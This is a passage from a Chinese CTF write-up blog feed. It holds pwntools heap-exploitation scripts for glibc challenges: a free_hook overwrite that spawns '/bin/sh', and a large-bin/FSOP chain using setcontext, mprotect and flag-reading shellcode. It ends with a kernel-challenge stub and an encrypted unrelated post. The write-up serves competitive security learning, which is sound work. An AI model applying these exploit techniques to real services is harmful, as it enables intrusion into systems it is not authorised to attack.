class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">&nbsp; &nbsp; io = remote(url,port)</span><br><span class="line">&nbsp; &nbsp; <span class="comment"># io = process('./'+binary)</span></span><br><span class="line">&nbsp; &nbsp; <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">12</span>):</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; add(i,<span class="number">0x60</span>,<span class="built_in">str</span>(i))</span><br><span class="line">&nbsp; &nbsp; add(<span class="number">14</span>,<span class="number">0x50</span>,<span class="string">'a'</span>)</span><br><span class="line">&nbsp; </span><br><span class="line">&nbsp; &nbsp; delete(<span class="number">2</span>)</span><br><span class="line">&nbsp; &nbsp; delete(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">&nbsp; &nbsp; edit(-<span class="number">61</span>,<span class="string">b'\x50'</span>)</span><br><span class="line"></span><br><span class="line">&nbsp; &nbsp; add(<span class="number">12</span>,<span class="number">0x60</span>,<span class="string">'a'</span>)</span><br><span class="line">&nbsp; &nbsp; add(<span class="number">13</span>,<span class="number">0x60</span>,<span class="string">'\x00'</span>)</span><br><span class="line">&nbsp; &nbsp; edit(<span class="number">1</span>,flat([<span class="string">'\x00'</span>*<span class="number">0x38</span>,<span class="number">0x421</span>]))</span><br><span class="line">&nbsp; &nbsp; delete(<span class="number">10</span>)</span><br><span class="line">&nbsp; &nbsp; add(<span class="number">10</span>,<span class="number">0x50</span>,<span class="string">'a'</span>)</span><br><span class="line">&nbsp; &nbsp; delete(<span class="number">13</span>)</span><br><span class="line"></span><br><span class="line">&nbsp; &nbsp; add(<span class="number">2</span>,<span class="number">0x70</span>,<span class="string">'a'</span>)</span><br><span class="line">&nbsp; &nbsp; add(<span class="number">3</span>,<span class="number">0x70</span>,<span class="string">'a'</span>)</span><br><span class="line">&nbsp; &nbsp; delete(<span class="number">11</span>)</span><br><span class="line">&nbsp; &nbsp; delete(<span class="number">12</span>)</span><br><span class="line">&nbsp; &nbsp; delete(<span class="number">5</span>)</span><br><span class="line">&nbsp; &nbsp; add(<span class="number">13</span>,<span class="number">0x70</span>,<span class="string">'a'</span>)</span><br><span class="line">&nbsp; &nbsp; edit(-<span class="number">61</span>,<span class="string">b'\xa0\x36'</span>)</span><br><span class="line"></span><br><span class="line">&nbsp; &nbsp; add(<span class="number">11</span>,<span class="number">0x60</span>,<span class="string">'a'</span>)</span><br><span class="line">&nbsp; &nbsp; fake_stdout = flat([</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; <span class="number">0xfbad1800</span>,</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; <span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; <span class="string">b'\x00'</span></span><br><span class="line">&nbsp; &nbsp; ])</span><br><span class="line">&nbsp; &nbsp; <span class="keyword">try</span>:</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; add(<span class="number">12</span>,<span class="number">0x60</span>,fake_stdout)</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; io.recv()</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; io.recv(<span class="number">8</span>)</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; stdin = u64(io.recv(<span class="number">8</span>))</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; leak_libc(<span class="string">'_IO_2_1_stdin_'</span>,stdin)</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">hex</span>(libc_base).startswith(<span class="string">"0x7f"</span>):</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; io.close()</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span class="keyword">continue</span></span><br><span class="line">&nbsp; &nbsp; <span class="keyword">except</span>:</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; io.close()</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; <span class="keyword">continue</span></span><br><span class="line">&nbsp; &nbsp; delete(<span class="number">10</span>)</span><br><span class="line">&nbsp; &nbsp; delete(<span class="number">14</span>)</span><br><span class="line">&nbsp; &nbsp; edit(-<span class="number">62</span>,p64(free_hook_addr))</span><br><span class="line">&nbsp; &nbsp; add(<span class="number">14</span>,<span class="number">0x50</span>,<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">&nbsp; &nbsp; add(<span class="number">10</span>,<span class="number">0x50</span>,p64(system_addr))</span><br><span class="line">  </span><br><span class="line">&nbsp; &nbsp; delete(<span class="number">14</span>)</span><br><span class="line"></span><br><span class="line">&nbsp; &nbsp; io.interactive()</span><br></pre></td></tr></tbody></table></figure><h2 id="tototo"><a href="#tototo" class="headerlink" title="tototo"></a>tototo</h2><p>glibc2.31堆题,开了沙箱,程序逻辑感觉有点莫名奇妙的<br>菜单有malloc、edit、show、delete、calloc.<br>malloc范围在0x200-0x800<br>delete只清空了flag位,但是这个位只在delete的时候检查,基本没用<br>edit存在uaf,但是是read(0,chunk_ptr+9,size-0x30),大概就是防止uaf直接改fd吧,edit有3次机会,超出使用调用edit函数.<br>然后有个free_hook的检查,不为0就exit.<br>直接cat就打了…</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">malloc(<span class="number">0</span>,<span class="number">0x420</span>)</span><br><span class="line">malloc(<span class="number">1</span>,<span class="number">0x210</span>)</span><br><span class="line">malloc(<span class="number">2</span>,<span class="number">0x410</span>)</span><br><span class="line">malloc(<span class="number">3</span>,<span class="number">0x210</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">io.recv()</span><br><span class="line">main_arena = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b'\x00'</span>))-<span class="number">96</span></span><br><span class="line">leak_libc(<span class="string">'__malloc_hook'</span>,main_arena-<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">io.recv()</span><br><span class="line">heap_base = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b'\x00'</span>))-<span class="number">0xd10</span></span><br><span class="line">log.success(<span class="string">"heap_base is -&gt;"</span>+<span class="built_in">hex</span>(heap_base))</span><br><span class="line"></span><br><span class="line">malloc(<span class="number">3</span>,<span class="number">0x500</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">0</span>,flat([p64(main_arena+<span class="number">1104</span>)[<span class="number">1</span>:],<span class="number">0</span>,io_list_all-<span class="number">0x20</span>]))</span><br><span class="line">malloc(<span class="number">4</span>,<span class="number">0x500</span>)</span><br><span class="line"></span><br><span class="line">fake_io_addr = heap_base+<span class="number">0x8e0</span></span><br><span class="line">cat = <span class="string">b'\x00'</span>*<span class="number">7</span></span><br><span class="line">cat+=p64(<span class="number">0</span>)*<span class="number">4</span></span><br><span class="line">cat +=p64(<span class="number">1</span>)+p64(<span class="number">2</span>) <span class="comment"># rcx!=0(FSOP)</span></span><br><span class="line">cat +=p64(fake_io_addr+<span class="number">0xb0</span>)<span class="comment">#_IO_backup_base=rdx</span></span><br><span class="line">cat +=p64(setcontext_addr+<span class="number">61</span>)<span class="comment">#_IO_save_end=call addr(call setcontext/system)</span></span><br><span class="line">cat = cat.ljust(<span class="number">0x4f</span>, <span class="string">b'\x00'</span>)</span><br><span class="line">cat += p64(<span class="number">0</span>) &nbsp;<span class="comment"># _chain</span></span><br><span class="line">cat = cat.ljust(<span class="number">0x6f</span>, <span class="string">b'\x00'</span>)</span><br><span class="line">cat += p64(heap_base+<span class="number">0x1000</span>) &nbsp;<span class="comment"># _lock = a writable address</span></span><br><span class="line">cat = cat.ljust(<span class="number">0x87</span>, <span class="string">b'\x00'</span>)</span><br><span class="line">cat +=p64(fake_io_addr+<span class="number">0x30</span>)<span class="comment">#_wide_data,rax1_addr</span></span><br><span class="line">cat = cat.ljust(<span class="number">0xa7</span>, <span class="string">b'\x00'</span>)</span><br><span class="line">cat += p64(<span class="number">1</span>) <span class="comment">#mode=1</span></span><br><span class="line">cat = cat.ljust(<span class="number">0xbf</span>, <span class="string">b'\x00'</span>)</span><br><span class="line">cat += p64(libc_base+libc.sym[<span class="string">'_IO_wfile_jumps'</span>]+<span class="number">0x30</span>) &nbsp;<span class="comment"># vtable=IO_wfile_jumps+0x10</span></span><br><span class="line">cat +=p64(<span class="number">0</span>)*<span class="number">6</span></span><br><span class="line">cat += p64(fake_io_addr+<span class="number">0x40</span>) &nbsp;<span class="comment"># rax2_addr</span></span><br><span class="line"></span><br><span class="line">frame = flat([heap_base,<span class="number">0x2000</span>,<span class="string">'\x00'</span>*<span class="number">0x10</span>,<span class="number">7</span>,<span class="string">'\x00'</span>*<span class="number">0x10</span>,fake_io_addr+<span class="number">0x160</span>,mprotect_addr])</span><br><span class="line"></span><br><span class="line">shellcode = asm(<span class="string">'''</span></span><br><span class="line"><span class="string">&nbsp; &nbsp; push 0x67616c66</span></span><br><span class="line"><span class="string">&nbsp; &nbsp; mov rdi,rsp</span></span><br><span class="line"><span class="string">&nbsp; &nbsp; xor esi,esi</span></span><br><span class="line"><span class="string">&nbsp; &nbsp; push 2</span></span><br><span class="line"><span class="string">&nbsp; &nbsp; pop rax</span></span><br><span class="line"><span class="string">&nbsp; &nbsp; syscall</span></span><br><span class="line"><span class="string">&nbsp; &nbsp; mov rdi,rax</span></span><br><span class="line"><span class="string">&nbsp; &nbsp; mov rsi,rsp</span></span><br><span class="line"><span class="string">&nbsp; &nbsp; mov edx,0x100</span></span><br><span class="line"><span class="string">&nbsp; &nbsp; xor eax,eax</span></span><br><span class="line"><span class="string">&nbsp; &nbsp; syscall</span></span><br><span class="line"><span class="string">&nbsp; &nbsp; mov edi,1</span></span><br><span class="line"><span class="string">&nbsp; &nbsp; push 1</span></span><br><span class="line"><span class="string">&nbsp; &nbsp; pop rax</span></span><br><span class="line"><span class="string">&nbsp; &nbsp; syscall</span></span><br><span class="line"><span class="string">'''</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">2</span>,cat+frame+p64(fake_io_addr+<span class="number">0x168</span>)+shellcode)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">'a'</span>)</span><br><span class="line">io.sendlineafter(<span class="string">'is:'</span>,<span class="string">'3'</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></tbody></table></figure><h2 id="kheap"><a href="#kheap" class="headerlink" title="kheap"></a>kheap</h2><p>好像是kernel的题,以后回来复现了…</p>]]></content>
      
      
      <categories>
          
          <category> ctf复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一生所爱</title>
      <link href="/2022/Flower-of-Love/"/>
      <url>/2022/Flower-of-Love/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="9145a3286f09fd9c07eed3109be9b7f029715ea34ef175f02ce30b9ebe07d55e">da4bbaa5f4a81c86b46c395d66869d966030e95d1b63f40456dab4a5b86457fd7553ffb65d7be5502668bf7b8131f2c96bbbe2dc01cacfd589ee5c151864832a3b30e814f6cda2503836c6054e2de9cdf4f9f180986070fe5aaf1c57b5e1c46a81f0aa7d2e15ea018e7f4ff28e05b5fd3e983ba41633549127fecb77b2707ccb7721fccc02130344f033c8e00c77f67103c4e67551e211b9f2c903b33782482eae916119214e2b66555375c136435706d48eededc5306433a13f642933be96dbbb42883cfae41f8c8513dbf8e2b468f2847895be778a4c1054d323de18291a870b01ffa42c58ad2afb1f3d50f592b3341f0304435d35e5474f8a3615842348ca0b8f9745249c63e3a295bd9e7a3cec080a6b272d9934c7e480ae2f44b306aed292fd3bf85084bc6aabdb7d03d158a874049cbf788365da14b0329e4ad9c9410e2e66532cb4eeb04f55ffe42105446f213a0b3ed478b762db641c3fae4f3c8cbdf72faef8efed3e866fd610a4f506856747722ed67c4871667701ea06199e44667ffd8b9e851f32947d38c3473fe9bbc82342e341890a560bea69c93c71cb7f38d56d0265aea723779d4f12336bf5fb43dd60eae9b33b9e762faf41a436a486a4215eec779daf533c415e4f22e81b3f004dfa88d530bbcea5688f58c434b48d39d333ae3a34cf394461e01ad8305c2f1a14f27a363232ffc2220878ca2059bc8b4668aedcfbe699b05a385aa940bffc5bd1debc835301bffe68a678994eba0ce5768fc2364719f2f106db15f2d1c22f20b79ad957037e47d3e33c4bc5b53bfdff00f974736438694ada384460086f048a7e8488cba514831ba97a85afb8b7ecd07a5961234971095f178ccdd4143ecd84223ed67261e43cccbf56531dfabff55c1e49c88577b080c75cac495e9cc4fa721c3cb19d757437a73df6fc5c25cfd7597130f8c52156307f2c7771f78401441ffeea5065ae825989493e4de5a2b3218a7d69029c84c835207349d4f6c386550c77d573dbacc414186939b3d6658843de18d077b92e7f0de876da2bec2db95c559a23263047f387e7e6b20c0a7f8f4cbd81662eb8c80c2e9027b6ccb7843e643b6feab37867a6093f1a306923a59062689e5bae1ad5f482360b11568f1a37ac22ac9853bef35e3c74d77bb39e443109002c1ef4d06d1afa907ae9d0219f61ae22df5b8db1983b2f2b7bbd354cb5df0bf8374a327501c383a2d82bbcac0709123f2611b3a84639762fc76c649200f27bcd73e2ee7cd66164917d3058e2a237831adbf3e7bcea820c4488940d8e5ce04c35e0cdd6ec300948fd5506a99a9c123c39db976bcafacb17fe29080d587b333f1293daeb1de92f30b05fd6f3592356378fc436e2305afa5e441c16db4d64387fc1b0856e2fb570a658163a74415078ac0486a73ef120a62ad95a82e14c53ee17d0e24d09b617eb505b4ffea96317daa5c6d403abeb249eed7fa7084297ebb86540f056260124302aa83e098ce6ae2c62578be681ef7995b02303c4b64719f78189fd415e87b01190012ef26c480372b3632f40345736dc1b893c48322081a1d03fd99a30406fd30a6bb4250a3579ed0f4b2b0e9dae58535b37cba3a43d661bad563e8cab2baf3e043b6b7d28ca3ab54c59833ef29434adb68f077cf4fa5c3338d16146ebd2d47b835a720183924b9eb026e281eb6905e101a230dbe4918e6ce72254f66d5b251a75b022dc5aa478cc2c1a1b73ee5c3b71bbbf85aec06318c3ad1abc4b1aa188e90b408e5e45b0399a41d571ba674c3b999ecf4fb73867bdab0103810fc20e30c53f1aaeb88c5a7660e05e5f0ce6818ebed9f61ead8f769e02fb7df06f2faba5368b28ed1425f838ebb3b228850c6ea22bc828e96b64f348f1c5df796727eb88e3c5ea59386a3bb5e9c2b784fa49929180d41d2d02a83f8e8527a50db0ec872d2bdb55eb3d3709b7eb8d09d8fe81d0e2b1bbd6688d11a1d49514e6bcd9b12dcca0d28a73fd5c3e2ae2a970279e10b697e03d37ec741f4656d1b1ea278753bb9e29cb918de9f871db523fc57813ff2f9bf56c8c0cd8e4738377f71bb3a93f7723b3d8e5eee54ca04f3152d96e25759a2f4e6d5659131ab006502bc952a626dd0c71bcbcf63479dc85052bf6a0be15724c0b0760ea5e1f233ad9c2cc10c09d10657cb51b3ca90e534c7fe67fb8fbec30fec83e9016713c9ddb9c98df267a4b3fa517cbf9c608dd741ba513ed13a818bd6684d18b0b98bdf5084bccde3692115f8aba6da138437001254c0ee919d0776fe8b043daa41a817e79ae48b7ea10fe80c15b099636e900adb67eda8955ee8faa1f958ca634125635138b4ae3d3232638b27936f6f606fe3699e6b9dfa9a9f392ef05fc652620595f49fe01069cff5ede48486e95e309504ca915439bb810df76fdce0057ea6dc85efe53824d99f607a3f79ea3664e2d8ff8904c3912e29b94344e9ab2a01aa78385a7b2b4c6e7b40471c5350bbbffef5c8ccd701d2982244f509cfdba6013a82c72f5731b7084b858254dd3a06740702064832f8ea7595030c5ae82228780587b0f8d77578dc2e64841650a0a6d8d39bb12b8665a7b5d8a348ee10ca7a0c44425acf32c0f0a0bc86b8485ec31c68fe7e42c3ab852803d942bf4734d2da0741b303cc633129f1d2dc91287dd048d2def17240be71af1dbe5b4989b97df62efc0911ac9fce29060cfbca2666791a97d9a47a56786a48d967538e7aa1cbe3c1dbfcd5d7c0190849d2e35205fca99bfa1ea980c0b6f034bf3e3aeaf85d4b5b84e6672868ae32a67c603e620d0bb8d59052bcf758294a108f6487030acfc78233886a25c16c1a8ddc28fd9f64af1fc03eb2a32994be0ef3e3eb2c01b477245b5e3d9f1a4e71c101bd539efccd6e4e01732398a81e654332b1f4515fb7eac7ef5f3cd4cbd2d9555fbb463be1feab46ddcb14839fe1ba68dece6143bd5d0bf6c062be7f78fb3182e2398c9c2479683e49b5bf5f14c455308692db30c0fef6f5a04126fef51027ecadd38227a78f8d458dd7a958df37f8b35adc6a1c1e821d5487db32c639290a953a4770fd159928db8b55f9c7da6ad963c159360861c2555c6070c486151baefd8695da3564957ec37dc459e030ec42ed773156386c6d32c1ca4ac60e75b08c4d3e81ba542a282a11117916b9e713dbfb57ffcd571cf1c6683ea9749b653d872883237fb209ea29087372a0dc1bc78aa9eeaa944f54e7dbe1ed2622687f11d482e5d95ec5ac5d234038f983982ede37ea342d2c144ed7a3f2fe2377d6ce9269a090900969fab882265a911e836343122f0bbea1458f456198cbe3aea426145a60804c6a60f6194dc7db96c623101800474662cb7adde0ca3572a5189db1c75f9a3485184d04869278e888f02f30bc0836b91f5d8e7fdf049f38092d2ae4dcf1ab9526a79b62ccd95583ab29b3f61e7ee6ce1d356c23fb0639b639dde98d23d7cd97abceefca064d4ae6cdfcc6a4cf269cb30d03b5f0302f5da2c7f9840b9fa1c1f1a0805e9a16be608e477bae6da35ebe9b98e51b904dbe57ddf845bd807221a2d9f8927a0a77abc3462cd85360dbbac3784a271387b9cfa73296728bd31eb63ccef350c3c3d23ff2f6425dc100e67849876f181b7347e4813992c33bfbe8dbfe1baccd5b99b8908cd8e88c4419ec1c726d0a325880bc0f05b4d024e32325828d4d6fa5842bee07fe8cb0501103f8dba8965cfcef37672a65376f1cf01d0f8dabd563f020b7f910f05c3b40e958d72cd43a9db1db0140d80078719ec1b8867001bc43303c4c7fd7f1fbd78a9765931731ee84f58c81614f09d4f0c56293f3a6a6ae01ee8f8acd671533be69cd2ce02cc714946908f9e3150262de4cefab6be00c9a376e0220e9476db924191a2583b3dafad764736ee8ed9045ebf4a93ef3f27caa99727fa16b1621539a72608b27d577a175ba8f2efb7264cf8f77b85e71e87f1edb799e82bd89a5434fe34da8eddf87db3a3f6a762c6148609ed9b68b8f1a9b30372422325459f7aac175519307c19653b825d761d90df575cd688315fc88e75788183ed163e3660252d8f6b54f762c5850098b1cf52d965848945fa0e71937bfd3bbeb33dffb39bde7271df9eabd3a23223c0c6791a1073994db7bd59fd8c51a056a31e5c6d71fa0646673703e37c9f8f5bf08c70ed0909910d99029f22c054e137098f8b0aec0a1b556730c53e14076e3ab8f616a52e7b8fda921d4a086b17a1d21ee893f819749c30b2154068ece9217c19200dda95f79d04129ca80a3d59d40beaf751ff6465ca3785d2a1ed8c6660ee87fa81d330a387055bfc1d9352a0cb170eced2d1daf9ed15ed84ff5144a03a003582826f9ac24a85276893b0bfab526986a653bd21d089fd0e161236298a7ed15732e98182b36625427edb5aba06a2fa76c75d63f81b433e1e3096f23af1292efcc393d36ef2547e7ab0c6af31d4e8d124ce5b81512054909dc999c83341024b5d89abf07a95c3210ce51029ee213d9fe37ec98e078397be033925bcaae11b869780b5d14c6458faed6a9ffce27efa8f00d663faf6adb1967fa43b02b4d70cc0e2a28624e16aeb89790e858f85f80c1ba285f1e09038dc88abe12e516cecdbd3be39cf4e24cc63c441fcd607aaccfc3ccd09ed88655738a4550c5e4b34ac4521902107fb4f9dd69c822c638c17b633708f19a563e35e851a54ff7fe991e1bc04b92797afd33c308fc51a5d46a9516fa16189178ea9ee43eea6d6c55944419efa8085651c76251a70bf655fb5a70393432ba6340bfde21cb84e3b446aa185418f872f64afc6c9a4e21ab571793025bf05da12e9bba2f88890f3a18ed1b5337047c39a5ef0f83c39312eecb72810aa548d94005bb7303b609715ec4e8231585002fc1711757ffcad656f6caee1140f093219d1e94c211be2fd4162f2e575d144e65ac411dce48de132f342f6cb64099d4b38f7294fb6914b49e367a2e0a985ee64d68cd4f9e1829df5288a6f263ab4c868a719770fe2c8fb42a55f4435937e368ce1c69d0e0a389d445a7c047331d1e5b784cff71b05808582c46fa72d77a289b2bffa446d2b8f7671f599b211dc7aa421cb069d99129f8560d7397f26a5cb0d59638b44c0cd9ebfb04587a4520c80d8a0d59e355cc2f33528cf8a5e9cfedbec309b1961d79929d31be9a283320a5fff5729d86fd4797b299ff8ecdc8d142f40c1fcf4c2a72a82dc3d1233ed71e43dd9881778a6b59cdcc0cbac71cf24e80c99a7f9273040b2e71408f85db82011626fb472548afc1040a5bb386ba4e9f469baac856656415b118910b3988edd01a8fb6e810b3e904e815218e926b0ac84c5ccded646aed17b273ff459800aa4b3e3760eb0cf1548f5091659013d671fdb531b3b7887f1efee38c92123749dc248678c45fee41315f753fd03e53e2b68209bb0c3fc831fccfb95a47c1dc4cf4497951f746d389a86f6087aa764ca3954657d255fcf2104f9b7118f01ae9c03f0b9616e34aaa0530f3124534626ed7633f0d71e3d602400bc351e3a9fa91d9f479dd5f7dcb2a39804fcfff7ae1c585885c331f918cb726a320be9eccf97c34b373bc99fe2ad5810e68dc24851e9756765058d6eb757f8c8f06bcfa20ceb3cfc1a81b275af63ce7203db454eb6b6391917acef1e0a7a3dc908116fa3520a891ef876b599a9dd3439353a347538a77f4053ce6dd90c8bd66fff178ca166573fe2009caf4c8128ceab18c9f778e917d95f0d3eed676f08eede52136c87ab6c3b65aa4aa435b3e92191cab881837baf77b57eee2cf9bedecaa6601289f12ed308a9584dd5097f6c6ef25d17d5f2c6d7ff45838a4740af85e9e761e0e9b9539dc043c2955b2a22f0f54b399ee27d160e2866924278adcae38e64aa82ea82adc159536ee403490a968cd9bdd7788a68adb6f115a0b2110d160b39960c695dcd93d8cd631ddb75a41463f9e7e0067f5cac4b242925e1fe7b257fb8b3778736391e1c724c7a29244d2badfa1c695862f1cdb52344d0bfa5515430d3ec930d390c25b7faf4cea1580c6d2b4bee892b10aae6c36824bf7af9fc1261696ebdafa5ca22837ed12a5fa6578e8a350e56ca35b12e911ba2807ad295fc6d391294b0fa5ab562b1f5f7f15419f8016b3be411e065722fa34aa5a4c76fe9d8561656678f1179c2cb0b8e0fe00f47d042d1ccbbdf924d55830b757297153bedeaf7dfe0fc974bce59f410a2f96212993e7ca7dc4264297d4bc2098ca4c69f12be931513faec07297e9fb10c9b6da0cea3a78b6dcaa048b0fff562febe059c025c39bc5d2c44fbb3c65c6df57951e000ed79175760e8148d87a3a4b302ca439f0a859905fa8fbd7cc01e346b8ee53fa1ed192a236361207ece40a202dcdcb480a7f983bbcaefed9f02100936523ec49bd235074b8f727e6ac4736563f8b8f86b647647c20a3f778dd2d66f957cf062409996dcbdd3332e3c0d96e4962b96c16f5f6693c710a595309b96029f707b768c7769f90b343a3421a0b8ce1756927c4642432539846baabcba4fedde1eb932f12d7e6543ace4aafabf1e0c4cd53d2a47e8e696229ad2d66650b0ca162396699bb0c67e9e857fe911ad27130eb8d64aacb1c921d0e712f442981a781206dd555869125455ff98c6806afe6e5592444e977f9fd9154ae3e2d0897e30df1eefe260f300a96bad5e9b1989312edced85d467619fcc8abf9c5c7ec58b4fae76da32caa84da02c0b0f33dc601d1c59722210c4966e264e1768a02e8e9096ba67ff022205162e222b5f779cec698e5aca7d29215b163b78cce6162065c21eb1226213ca7a016cdf4da66e627b2cb0fd3e434cffa9f65e7d4269bc503893f879cd865bf9801c3fc8d0b08e45c7187a9fa508a28cedb6661872c02278a09695d2a7565bbe390420cc2c880dbaf611b9faf916cde9357126bf2bc25b832a09074b983c95b6c50ddbe258b02cb81c65f949a2ca140a40216380565333476caa1446c7450404f24de54cd36f55bba4a766dbe4410a707aed01da8a237f01cf06e9eae58531367dd0c41bb22e04355e23b2b2046c1276436ca09d3f01df3299be63abcd6239a58ada3c20a1adb30b0024b0847ba562cc6216eff1ddcb52088d42e208fede00fe1a80a65e790f259f108320bd66bfc896bc20759ddf2d8d5f81959d126a5836c0ade4b8d2176b330b258063e599fac90b761d23f988f03bc0ce1d0290815ffb7afb99c2bf9ed2e5bd9d48cff3d2e06d355f718a2ab448f8ba65ff17c2edc84ce4d22b9dc7071a9aa2e844a5c6397d51668d0345c1aa113e0b34c1b6eb0590e6bfbecdf51a9e97e58fef42a67da3a8a3c8c06cee1dbd36001fa0a49e0c84a07eca9efc7b82cbd652397742b61f52249484022820472836ddb0aca35a1ce7fe104a85846b5c0d58fd82a6e0e22c74d81a51f9da1ac93cbca99564401fbf90e848a042b29fb898fe6505f99006dff30f8c5e49309264a745b207676628aca095451ee0a4ea8533e54de45e2155da3b2017f97a771ac9c00c6594b755d76c769be1b49f53645d07a2f398d93558758e2e984949950f4ad3c619eb28a3b35902edf1698332b1f0f866db9e7dafee7ddb1443fcf7a02a769002f0e7a9947c03cf00972e2acba95044d76102bd3bdef56ad97988deb7b47ef79906946d7f51627e6125b96a5f41fb7ad989285ed6a2cba91b83cf143dcb82b11d2a7d2f5067632ac9d9db470998fc48a2952b39e43874dadba7a31354fa41aa2eec6ba386322574cefd5d9a30782a24eca26545f2795648b0ecfbffc29370f676bd941a5cbcbd7145b8529e9283719c5c2f84e782f1be4a11bd209efafae2e0df3ee616cd2eb1c53de50939fbc26c798b4bd4447704197d71735f6607db354f423daa868856bf306ac12a8b5ca43ae5a8035e45ac5c7996b0f11df75e503831f6462367c4032e8b4dbf4af1639e07ad74df40fa4a453e024e6bb4dcdf90addf15e271b048a048a755d6b1a216ec59edf4ae78513b5652818274ba22cc77c63f8df9c846d703e69905591c5cd85d69c467f5cbe20f4fcb7febf0275841ab6a838bf3782f60943bd42b3e68cca12074b1a3db18dceddc23aa1f5deb1004dd122f9e91e23aeb101279c4d9a87da289c013f413eaee887a0d7c30fce356772ea1fbf239b19d0d3d23c2b287612362457370b00f39ccb08a45f423304672d54ed66ba0c536ffe6c058e81c44f167d76f1ce6ed36937d962a2e65d000a32adf306336a728cccdff065c80a84c6dcc231fb42b2cf51a1b6b791b1b7a4a414b1c2c3d22ad5f04f20da0064c87f9aa79bb8dd0e6a6c35ca3a1b3705bb501aa7004586ff627a463c33c7efd6d95d1b8089cb1f210d2c830f57f88bff8fd85f19dd4b0127cc6f3090659be2284cb8522a82f2cef28e655c744647588bebab90a3983050d3be26e922c4635d9f8a1fec68d705a831ded4a18d620b67153bfdee38f6b33f21f2441fbefd6a5fb99eb40aa48799c81b1c31c45bbf968d8c3afa0d6a9685e0b269e1eb4b662094c303d22ba72697d2e7eb9d34fdee1bcd830fb88a5b016beb3b37bc30be7fd3531eb4345ae9c3ed83ad8473eaabb2b3144e3a